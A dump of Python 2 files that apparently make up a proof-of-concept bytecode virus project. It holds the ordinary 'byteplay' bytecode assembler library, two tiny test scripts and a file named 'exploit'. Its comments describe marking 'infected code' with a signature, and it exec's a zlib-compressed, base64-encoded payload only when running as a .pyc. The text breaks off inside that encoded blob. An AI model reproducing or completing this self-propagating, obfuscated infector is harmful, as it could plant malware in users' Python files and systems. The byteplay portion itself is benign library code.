__FILENAME__ = b
print "Original"

########NEW FILE########
__FILENAME__ = byteplay
# byteplay - Python bytecode assembler/disassembler.
# Copyright (C) 2006-2010 Noam Yorav-Raphael
# Homepage: http://code.google.com/p/byteplay
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA

# Many thanks to Greg X for adding support for Python 2.6 and 2.7!

__all__ = ['opmap', 'opname', 'opcodes',
           'cmp_op', 'hasarg', 'hasname', 'hasjrel', 'hasjabs',
           'hasjump', 'haslocal', 'hascompare', 'hasfree', 'hascode',
           'hasflow', 'getse',
           'Opcode', 'SetLineno', 'Label', 'isopcode', 'Code',
           'CodeList', 'printcodelist']

import opcode
from dis import findlabels
import types
from array import array
import operator
import itertools
import sys
import warnings
from cStringIO import StringIO
import marshal 

######################################################################
# Define opcodes and information about them

python_version = '.'.join(str(x) for x in sys.version_info[:2])
if python_version not in ('2.4', '2.5', '2.6', '2.7'):
    warnings.warn("byteplay doesn't support Python version "+python_version)

class Opcode(int):
    """An int which represents an opcode - has a nicer repr."""
    def __repr__(self):
        return opname[self]
    __str__ = __repr__

class CodeList(list):
    """A list for storing opcode tuples - has a nicer __str__."""
    def __str__(self):
        f = StringIO()
        printcodelist(self, f)
        return f.getvalue()

opmap = dict((name.replace('+', '_'), Opcode(code))
             for name, code in opcode.opmap.iteritems()
             if name != 'EXTENDED_ARG')
opname = dict((code, name) for name, code in opmap.iteritems())
opcodes = set(opname)

def globalize_opcodes():
    for name, code in opmap.iteritems():
        globals()[name] = code
        __all__.append(name)
globalize_opcodes()

cmp_op = opcode.cmp_op

hasarg = set(x for x in opcodes if x >= opcode.HAVE_ARGUMENT)
hasconst = set(Opcode(x) for x in opcode.hasconst)
hasname = set(Opcode(x) for x in opcode.hasname)
hasjrel = set(Opcode(x) for x in opcode.hasjrel)
hasjabs = set(Opcode(x) for x in opcode.hasjabs)
hasjump = hasjrel.union(hasjabs)
haslocal = set(Opcode(x) for x in opcode.haslocal)
hascompare = set(Opcode(x) for x in opcode.hascompare)
hasfree = set(Opcode(x) for x in opcode.hasfree)
hascode = set([MAKE_FUNCTION, MAKE_CLOSURE])

class _se:
    """Quick way of defining static stack effects of opcodes"""
    # Taken from assembler.py by Phillip J. Eby
    NOP       = 0,0

    POP_TOP   = 1,0
    ROT_TWO   = 2,2
    ROT_THREE = 3,3
    ROT_FOUR  = 4,4
    DUP_TOP   = 1,2

    UNARY_POSITIVE = UNARY_NEGATIVE = UNARY_NOT = UNARY_CONVERT = \
        UNARY_INVERT = GET_ITER = LOAD_ATTR = 1,1

    IMPORT_FROM = 1,2

    BINARY_POWER = BINARY_MULTIPLY = BINARY_DIVIDE = BINARY_FLOOR_DIVIDE = \
        BINARY_TRUE_DIVIDE = BINARY_MODULO = BINARY_ADD = BINARY_SUBTRACT = \
        BINARY_SUBSCR = BINARY_LSHIFT = BINARY_RSHIFT = BINARY_AND = \
        BINARY_XOR = BINARY_OR = COMPARE_OP = 2,1

    INPLACE_POWER = INPLACE_MULTIPLY = INPLACE_DIVIDE = \
        INPLACE_FLOOR_DIVIDE = INPLACE_TRUE_DIVIDE = INPLACE_MODULO = \
        INPLACE_ADD = INPLACE_SUBTRACT = INPLACE_LSHIFT = INPLACE_RSHIFT = \
        INPLACE_AND = INPLACE_XOR = INPLACE_OR = 2,1

    SLICE_0, SLICE_1, SLICE_2, SLICE_3 = \
        (1,1),(2,1),(2,1),(3,1)
    STORE_SLICE_0, STORE_SLICE_1, STORE_SLICE_2, STORE_SLICE_3 = \
        (2,0),(3,0),(3,0),(4,0)
    DELETE_SLICE_0, DELETE_SLICE_1, DELETE_SLICE_2, DELETE_SLICE_3 = \
        (1,0),(2,0),(2,0),(3,0)

    STORE_SUBSCR = 3,0
    DELETE_SUBSCR = STORE_ATTR = 2,0
    DELETE_ATTR = STORE_DEREF = 1,0
    PRINT_NEWLINE = 0,0
    PRINT_EXPR = PRINT_ITEM = PRINT_NEWLINE_TO = IMPORT_STAR = 1,0
    STORE_NAME = STORE_GLOBAL = STORE_FAST = 1,0
    PRINT_ITEM_TO = 2,0

    LOAD_LOCALS = LOAD_CONST = LOAD_NAME = LOAD_GLOBAL = LOAD_FAST = \
        LOAD_CLOSURE = LOAD_DEREF = BUILD_MAP = 0,1

    DELETE_FAST = DELETE_GLOBAL = DELETE_NAME = 0,0

    EXEC_STMT = 3,0
    BUILD_CLASS = 3,1

    STORE_MAP = MAP_ADD = 2,0
    SET_ADD = 1,0

    if   python_version == '2.4':
      YIELD_VALUE = 1,0
      IMPORT_NAME = 1,1
      LIST_APPEND = 2,0
    elif python_version == '2.5':
      YIELD_VALUE = 1,1
      IMPORT_NAME = 2,1
      LIST_APPEND = 2,0
    elif python_version == '2.6':
      YIELD_VALUE = 1,1
      IMPORT_NAME = 2,1
      LIST_APPEND = 2,0
    elif python_version == '2.7':
      YIELD_VALUE = 1,1
      IMPORT_NAME = 2,1
      LIST_APPEND = 1,0


_se = dict((op, getattr(_se, opname[op]))
           for op in opcodes
           if hasattr(_se, opname[op]))

hasflow = opcodes - set(_se) - \
          set([CALL_FUNCTION, CALL_FUNCTION_VAR, CALL_FUNCTION_KW,
               CALL_FUNCTION_VAR_KW, BUILD_TUPLE, BUILD_LIST,
               UNPACK_SEQUENCE, BUILD_SLICE, DUP_TOPX,
               RAISE_VARARGS, MAKE_FUNCTION, MAKE_CLOSURE])
if python_version == '2.7':
  hasflow = hasflow - set([BUILD_SET])

def getse(op, arg=None):
    """Get the stack effect of an opcode, as a (pop, push) tuple.

    If an arg is needed and is not given, a ValueError is raised.
    If op isn't a simple opcode, that is, the flow doesn't always continue
    to the next opcode, a ValueError is raised.
    """
    try:
        return _se[op]
    except KeyError:
        # Continue to opcodes with an effect that depends on arg
        pass

    if arg is None:
        raise ValueError, "Opcode stack behaviour depends on arg"

    def get_func_tup(arg, nextra):
        if arg > 0xFFFF:
            raise ValueError, "Can only split a two-byte argument"
        return (nextra + 1 + (arg & 0xFF) + 2*((arg >> 8) & 0xFF),
                1)

    if op == CALL_FUNCTION:
        return get_func_tup(arg, 0)
    elif op == CALL_FUNCTION_VAR:
        return get_func_tup(arg, 1)
    elif op == CALL_FUNCTION_KW:
        return get_func_tup(arg, 1)
    elif op == CALL_FUNCTION_VAR_KW:
        return get_func_tup(arg, 2)

    elif op == BUILD_TUPLE:
        return arg, 1
    elif op == BUILD_LIST:
        return arg, 1
    elif python_version == '2.7' and op == BUILD_SET:
        return arg, 1
    elif op == UNPACK_SEQUENCE:
        return 1, arg
    elif op == BUILD_SLICE:
        return arg, 1
    elif op == DUP_TOPX:
        return arg, arg*2
    elif op == RAISE_VARARGS:
        return 1+arg, 1
    elif op == MAKE_FUNCTION:
        return 1+arg, 1
    elif op == MAKE_CLOSURE:
        if python_version == '2.4':
            raise ValueError, "The stack effect of MAKE_CLOSURE depends on TOS"
        else:
            return 2+arg, 1
    else:
        raise ValueError, "The opcode %r isn't recognized or has a special "\
              "flow control" % op

class SetLinenoType(object):
    def __repr__(self):
        return 'SetLineno'
SetLineno = SetLinenoType()

class Label(object):
    pass

def isopcode(obj):
    """Return whether obj is an opcode - not SetLineno or Label"""
    return obj is not SetLineno and not isinstance(obj, Label)

# Flags from code.h
CO_OPTIMIZED              = 0x0001      # use LOAD/STORE_FAST instead of _NAME
CO_NEWLOCALS              = 0x0002      # only cleared for module/exec code
CO_VARARGS                = 0x0004
CO_VARKEYWORDS            = 0x0008
CO_NESTED                 = 0x0010      # ???
CO_GENERATOR              = 0x0020
CO_NOFREE                 = 0x0040      # set if no free or cell vars
CO_GENERATOR_ALLOWED      = 0x1000      # unused
# The future flags are only used on code generation, so we can ignore them.
# (It does cause some warnings, though.)
CO_FUTURE_DIVISION        = 0x2000
CO_FUTURE_ABSOLUTE_IMPORT = 0x4000
CO_FUTURE_WITH_STATEMENT  = 0x8000


######################################################################
# Define the Code class

class Code(object):
    """An object which holds all the information which a Python code object
    holds, but in an easy-to-play-with representation.

    The attributes are:

    Affecting action
    ----------------
    code - list of 2-tuples: the code
    freevars - list of strings: the free vars of the code (those are names
               of variables created in outer functions and used in the function)
    args - list of strings: the arguments of the code
    varargs - boolean: Does args end with a '*args' argument
    varkwargs - boolean: Does args end with a '**kwargs' argument
    newlocals - boolean: Should a new local namespace be created.
                (True in functions, False for module and exec code)

    Not affecting action
    --------------------
    name - string: the name of the code (co_name)
    filename - string: the file name of the code (co_filename)
    firstlineno - int: the first line number (co_firstlineno)
    docstring - string or None: the docstring (the first item of co_consts,
                if it's str or unicode)

    code is a list of 2-tuples. The first item is an opcode, or SetLineno, or a
    Label instance. The second item is the argument, if applicable, or None.
    code can be a CodeList instance, which will produce nicer output when
    being printed.
    """
    def __init__(self, code, freevars, args, varargs, varkwargs, newlocals,
                 name, filename, firstlineno, docstring):
        self.code = code
        self.freevars = freevars
        self.args = args
        self.varargs = varargs
        self.varkwargs = varkwargs
        self.newlocals = newlocals
        self.name = name
        self.filename = filename
        self.firstlineno = firstlineno
        self.docstring = docstring

    @staticmethod
    def _findlinestarts(code):
        """Find the offsets in a byte code which are start of lines in the
        source.

        Generate pairs (offset, lineno) as described in Python/compile.c.

        This is a modified version of dis.findlinestarts, which allows multiple
        "line starts" with the same line number.
        """
        byte_increments = [ord(c) for c in code.co_lnotab[0::2]]
        line_increments = [ord(c) for c in code.co_lnotab[1::2]]

        lineno = code.co_firstlineno
        addr = 0
        for byte_incr, line_incr in zip(byte_increments, line_increments):
            if byte_incr:
                yield (addr, lineno)
                addr += byte_incr
            lineno += line_incr
        yield (addr, lineno)

    @classmethod
    def from_code(cls, co):
        """Disassemble a Python code object into a Code object."""
        co_code = co.co_code
        labels = dict((addr, Label()) for addr in findlabels(co_code))
        linestarts = dict(cls._findlinestarts(co))
        cellfree = co.co_cellvars + co.co_freevars

        code = CodeList()
        n = len(co_code)
        i = 0
        extended_arg = 0
        while i < n:
            op = Opcode(ord(co_code[i]))
            if i in labels:
                code.append((labels[i], None))
            if i in linestarts:
                code.append((SetLineno, linestarts[i]))
            i += 1
            if op in hascode:
                lastop, lastarg = code[-1]
                if lastop != LOAD_CONST:
                    raise ValueError, \
                          "%s should be preceded by LOAD_CONST code" % op
                code[-1] = (LOAD_CONST, Code.from_code(lastarg))
            if op not in hasarg:
                code.append((op, None))
            else:
                arg = ord(co_code[i]) + ord(co_code[i+1])*256 + extended_arg
                extended_arg = 0
                i += 2
                if op == opcode.EXTENDED_ARG:
                    extended_arg = arg << 16
                elif op in hasconst:
                    code.append((op, co.co_consts[arg]))
                elif op in hasname:
                    code.append((op, co.co_names[arg]))
                elif op in hasjabs:
                    code.append((op, labels[arg]))
                elif op in hasjrel:
                    code.append((op, labels[i + arg]))
                elif op in haslocal:
                    code.append((op, co.co_varnames[arg]))
                elif op in hascompare:
                    code.append((op, cmp_op[arg]))
                elif op in hasfree:
                    code.append((op, cellfree[arg]))
                else:
                    code.append((op, arg))

        varargs = bool(co.co_flags & CO_VARARGS)
        varkwargs = bool(co.co_flags & CO_VARKEYWORDS)
        newlocals = bool(co.co_flags & CO_NEWLOCALS)
        args = co.co_varnames[:co.co_argcount + varargs + varkwargs]
        if co.co_consts and isinstance(co.co_consts[0], basestring):
            docstring = co.co_consts[0]
        else:
            docstring = None
        return cls(code = code,
                   freevars = co.co_freevars,
                   args = args,
                   varargs = varargs,
                   varkwargs = varkwargs,
                   newlocals = newlocals,
                   name = co.co_name,
                   filename = co.co_filename,
                   firstlineno = co.co_firstlineno,
                   docstring = docstring,
                   )

    def __eq__(self, other):
        if (self.freevars != other.freevars or
            self.args != other.args or
            self.varargs != other.varargs or
            self.varkwargs != other.varkwargs or
            self.newlocals != other.newlocals or
            self.name != other.name or
            self.filename != other.filename or
            self.firstlineno != other.firstlineno or
            self.docstring != other.docstring or
            len(self.code) != len(other.code)
            ):
            return False

        # Compare code. This isn't trivial because labels should be matching,
        # not equal.
        labelmapping = {}
        for (op1, arg1), (op2, arg2) in itertools.izip(self.code, other.code):
            if isinstance(op1, Label):
                if labelmapping.setdefault(op1, op2) is not op2:
                    return False
            else:
                if op1 != op2:
                    return False
                if op1 in hasjump:
                    if labelmapping.setdefault(arg1, arg2) is not arg2:
                        return False
                elif op1 in hasarg:
                    if arg1 != arg2:
                        return False
        return True

    def _compute_flags(self):
        opcodes = set(op for op, arg in self.code if isopcode(op))

        optimized = (STORE_NAME not in opcodes and
                     LOAD_NAME not in opcodes and
                     DELETE_NAME not in opcodes)
        generator = (YIELD_VALUE in opcodes)
        nofree = not (opcodes.intersection(hasfree))

        flags = 0
        if optimized: flags |= CO_OPTIMIZED
        if self.newlocals: flags |= CO_NEWLOCALS
        if self.varargs: flags |= CO_VARARGS
        if self.varkwargs: flags |= CO_VARKEYWORDS
        if generator: flags |= CO_GENERATOR
        if nofree: flags |= CO_NOFREE
        return flags

    def _compute_stacksize(self):
        """Get a code list, compute its maximal stack usage."""
        # This is done by scanning the code, and computing for each opcode
        # the stack state at the opcode.
        code = self.code

        # A mapping from labels to their positions in the code list
        label_pos = dict((op, pos)
                         for pos, (op, arg) in enumerate(code)
                         if isinstance(op, Label))

        # sf_targets are the targets of SETUP_FINALLY opcodes. They are recorded
        # because they have special stack behaviour. If an exception was raised
        # in the block pushed by a SETUP_FINALLY opcode, the block is popped
        # and 3 objects are pushed. On return or continue, the block is popped
        # and 2 objects are pushed. If nothing happened, the block is popped by
        # a POP_BLOCK opcode and 1 object is pushed by a (LOAD_CONST, None)
        # operation.
        #
        # Our solution is to record the stack state of SETUP_FINALLY targets
        # as having 3 objects pushed, which is the maximum. However, to make
        # stack recording consistent, the get_next_stacks function will always
        # yield the stack state of the target as if 1 object was pushed, but
        # this will be corrected in the actual stack recording.

        sf_targets = set(label_pos[arg]
                         for op, arg in code
                         if op == SETUP_FINALLY)

        # What we compute - for each opcode, its stack state, as an n-tuple.
        # n is the number of blocks pushed. For each block, we record the number
        # of objects pushed.
        stacks = [None] * len(code)

        def get_next_stacks(pos, curstack):
            """Get a code position and the stack state before the operation
            was done, and yield pairs (pos, curstack) for the next positions
            to be explored - those are the positions to which you can get
            from the given (pos, curstack).

            If the given position was already explored, nothing will be yielded.
            """
            op, arg = code[pos]

            if isinstance(op, Label):
                # We should check if we already reached a node only if it is
                # a label.
                if pos in sf_targets:
                    curstack = curstack[:-1] + (curstack[-1] + 2,)
                if stacks[pos] is None:
                    stacks[pos] = curstack
                else:
                    if stacks[pos] != curstack:
                        raise ValueError, "Inconsistent code"
                    return

            def newstack(n):
                # Return a new stack, modified by adding n elements to the last
                # block
                if curstack[-1] + n < 0:
                    raise ValueError, "Popped a non-existing element"
                return curstack[:-1] + (curstack[-1]+n,)

            if not isopcode(op):
                # label or SetLineno - just continue to next line
                yield pos+1, curstack

            elif op in (STOP_CODE, RETURN_VALUE, RAISE_VARARGS):
                # No place in particular to continue to
                pass

            elif op == MAKE_CLOSURE and python_version == '2.4':
                # This is only relevant in Python 2.4 - in Python 2.5 the stack
                # effect of MAKE_CLOSURE can be calculated from the arg.
                # In Python 2.4, it depends on the number of freevars of TOS,
                # which should be a code object.
                if pos == 0:
                    raise ValueError, \
                          "MAKE_CLOSURE can't be the first opcode"
                lastop, lastarg = code[pos-1]
                if lastop != LOAD_CONST:
                    raise ValueError, \
                          "MAKE_CLOSURE should come after a LOAD_CONST op"
                try:
                    nextrapops = len(lastarg.freevars)
                except AttributeError:
                    try:
                        nextrapops = len(lastarg.co_freevars)
                    except AttributeError:
                        raise ValueError, \
                              "MAKE_CLOSURE preceding const should "\
                              "be a code or a Code object"

                yield pos+1, newstack(-arg-nextrapops)

            elif op not in hasflow:
                # Simple change of stack
                pop, push = getse(op, arg)
                yield pos+1, newstack(push - pop)

            elif op in (JUMP_FORWARD, JUMP_ABSOLUTE):
                # One possibility for a jump
                yield label_pos[arg], curstack

            elif python_version < '2.7' and op in (JUMP_IF_FALSE, JUMP_IF_TRUE):
                # Two possibilities for a jump
                yield label_pos[arg], curstack
                yield pos+1, curstack

            elif python_version >= '2.7' and op in (POP_JUMP_IF_FALSE, POP_JUMP_IF_TRUE):
                # Two possibilities for a jump
                yield label_pos[arg], newstack(-1)
                yield pos+1, newstack(-1)

            elif python_version >= '2.7' and op in (JUMP_IF_TRUE_OR_POP, JUMP_IF_FALSE_OR_POP):
                # Two possibilities for a jump
                yield label_pos[arg], curstack
                yield pos+1, newstack(-1)

            elif op == FOR_ITER:
                # FOR_ITER pushes next(TOS) on success, and pops TOS and jumps
                # on failure
                yield label_pos[arg], newstack(-1)
                yield pos+1, newstack(1)

            elif op == BREAK_LOOP:
                # BREAK_LOOP jumps to a place specified on block creation, so
                # it is ignored here
                pass

            elif op == CONTINUE_LOOP:
                # CONTINUE_LOOP jumps to the beginning of a loop which should
                # already ave been discovered, but we verify anyway.
                # It pops a block.
                if python_version == '2.6':
                  pos, stack = label_pos[arg], curstack[:-1]
                  if stacks[pos] != stack: #this could be a loop with a 'with' inside
                    yield pos, stack[:-1] + (stack[-1]-1,)
                  else:
                    yield pos, stack
                else:
                  yield label_pos[arg], curstack[:-1]

            elif op == SETUP_LOOP:
                # We continue with a new block.
                # On break, we jump to the label and return to current stack
                # state.
                yield label_pos[arg], curstack
                yield pos+1, curstack + (0,)

            elif op == SETUP_EXCEPT:
                # We continue with a new block.
                # On exception, we jump to the label with 3 extra objects on
                # stack
                yield label_pos[arg], newstack(3)
                yield pos+1, curstack + (0,)

            elif op == SETUP_FINALLY:
                # We continue with a new block.
                # On exception, we jump to the label with 3 extra objects on
                # stack, but to keep stack recording consistent, we behave as
                # if we add only 1 object. Extra 2 will be added to the actual
                # recording.
                yield label_pos[arg], newstack(1)
                yield pos+1, curstack + (0,)

            elif python_version == '2.7' and op == SETUP_WITH:
                yield label_pos[arg], curstack
                yield pos+1, newstack(-1) + (1,)

            elif op == POP_BLOCK:
                # Just pop the block
                yield pos+1, curstack[:-1]

            elif op == END_FINALLY:
                # Since stack recording of SETUP_FINALLY targets is of 3 pushed
                # objects (as when an exception is raised), we pop 3 objects.
                yield pos+1, newstack(-3)

            elif op == WITH_CLEANUP:
                # Since WITH_CLEANUP is always found after SETUP_FINALLY
                # targets, and the stack recording is that of a raised
                # exception, we can simply pop 1 object and let END_FINALLY
                # pop the remaining 3.
                if python_version == '2.7':
                  yield pos+1, newstack(2)
                else:
                  yield pos+1, newstack(-1)

            else:
                assert False, "Unhandled opcode: %r" % op


        # Now comes the calculation: open_positions holds positions which are
        # yet to be explored. In each step we take one open position, and
        # explore it by adding the positions to which you can get from it, to
        # open_positions. On the way, we update maxsize.
        # open_positions is a list of tuples: (pos, stack state)
        maxsize = 0
        open_positions = [(0, (0,))]
        while open_positions:
            pos, curstack = open_positions.pop()
            maxsize = max(maxsize, sum(curstack))
            open_positions.extend(get_next_stacks(pos, curstack))

        return maxsize

    def to_code(self):
        """Assemble a Python code object from a Code object."""
        co_argcount = len(self.args) - self.varargs - self.varkwargs
        co_stacksize = self._compute_stacksize()
        co_flags = self._compute_flags()

        co_consts = [self.docstring]
        co_names = []
        co_varnames = list(self.args)

        co_freevars = tuple(self.freevars)

        # We find all cellvars beforehand, for two reasons:
        # 1. We need the number of them to construct the numeric argument
        #    for ops in "hasfree".
        # 2. We need to put arguments which are cell vars in the beginning
        #    of co_cellvars
        cellvars = set(arg for op, arg in self.code
                       if isopcode(op) and op in hasfree
                       and arg not in co_freevars)
        co_cellvars = [x for x in self.args if x in cellvars]

        def index(seq, item, eq=operator.eq, can_append=True):
            """Find the index of item in a sequence and return it.
            If it is not found in the sequence, and can_append is True,
            it is appended to the sequence.

            eq is the equality operator to use.
            """
            for i, x in enumerate(seq):
                if eq(x, item):
                    return i
            else:
                if can_append:
                    seq.append(item)
                    return len(seq) - 1
                else:
                    raise IndexError, "Item not found"

        # List of tuples (pos, label) to be filled later
        jumps = []
        # A mapping from a label to its position
        label_pos = {}
        # Last SetLineno
        lastlineno = self.firstlineno
        lastlinepos = 0

        co_code = array('B')
        co_lnotab = array('B')
        for i, (op, arg) in enumerate(self.code):
            if isinstance(op, Label):
                label_pos[op] = len(co_code)

            elif op is SetLineno:
                incr_lineno = arg - lastlineno
                incr_pos = len(co_code) - lastlinepos
                lastlineno = arg
                lastlinepos = len(co_code)

                if incr_lineno == 0 and incr_pos == 0:
                    co_lnotab.append(0)
                    co_lnotab.append(0)
                else:
                    while incr_pos > 255:
                        co_lnotab.append(255)
                        co_lnotab.append(0)
                        incr_pos -= 255
                    while incr_lineno > 255:
                        co_lnotab.append(incr_pos)
                        co_lnotab.append(255)
                        incr_pos = 0
                        incr_lineno -= 255
                    if incr_pos or incr_lineno:
                        co_lnotab.append(incr_pos)
                        co_lnotab.append(incr_lineno)

            elif op == opcode.EXTENDED_ARG:
                raise ValueError, "EXTENDED_ARG not supported in Code objects"

            elif not op in hasarg:
                co_code.append(op)

            else:
                if op in hasconst:
                    if isinstance(arg, Code) and i < len(self.code)-1 and \
                       self.code[i+1][0] in hascode:
                        arg = arg.to_code()
                    arg = index(co_consts, arg, operator.is_)
                elif op in hasname:
                    arg = index(co_names, arg)
                elif op in hasjump:
                    # arg will be filled later
                    jumps.append((len(co_code), arg))
                    arg = 0
                elif op in haslocal:
                    arg = index(co_varnames, arg)
                elif op in hascompare:
                    arg = index(cmp_op, arg, can_append=False)
                elif op in hasfree:
                    try:
                        arg = index(co_freevars, arg, can_append=False) \
                              + len(cellvars)
                    except IndexError:
                        arg = index(co_cellvars, arg)
                else:
                    # arg is ok
                    pass

                if arg > 0xFFFF:
                    co_code.append(opcode.EXTENDED_ARG)
                    co_code.append((arg >> 16) & 0xFF)
                    co_code.append((arg >> 24) & 0xFF)
                co_code.append(op)
                co_code.append(arg & 0xFF)
                co_code.append((arg >> 8) & 0xFF)

        for pos, label in jumps:
            jump = label_pos[label]
            if co_code[pos] in hasjrel:
                jump -= pos+3
            if jump > 0xFFFF:
                raise NotImplementedError, "Extended jumps not implemented"
            co_code[pos+1] = jump & 0xFF
            co_code[pos+2] = (jump >> 8) & 0xFF

        co_code = co_code.tostring()
        co_lnotab = co_lnotab.tostring()

        co_consts = tuple(co_consts)
        co_names = tuple(co_names)
        co_varnames = tuple(co_varnames)
        co_nlocals = len(co_varnames)
        co_cellvars = tuple(co_cellvars)

        return types.CodeType(co_argcount, co_nlocals, co_stacksize, co_flags,
                              co_code, co_consts, co_names, co_varnames,
                              self.filename, self.name, self.firstlineno, co_lnotab,
                              co_freevars, co_cellvars)

########NEW FILE########
__FILENAME__ = c
print __file__
import inspect
print inspect.getfile(inspect.currentframe())


########NEW FILE########
__FILENAME__ = exploit
signature = "DC9723" #signature is placed at beginning and end of file to identify infected code
import glob, zlib, base64

#File only works as a pyc
if __file__.endswith('.pyc'):
	   
   #The minified version of byteplay
   exec zlib.decompress(base64.b64decode('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